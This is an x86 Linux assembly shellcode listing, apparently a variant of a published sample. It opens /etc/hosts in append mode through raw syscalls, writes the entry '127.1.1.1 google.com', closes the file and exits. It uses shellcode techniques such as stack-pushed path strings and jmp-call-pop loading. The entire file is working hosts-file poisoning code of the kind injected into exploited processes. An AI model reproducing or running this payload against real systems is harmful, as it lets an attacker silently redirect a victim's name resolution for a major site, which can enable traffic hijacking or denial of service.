;893.php

global _start

section .text

_start:
    ;xor ecx, ecx
    mov edx, ecx
    xor ecx, edx


    mul ecx
    mov al, 0x5     

    ;push ecx
    mov dword [esp-4], eax
    sub esp, 4


    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    cld
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file
    std
    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
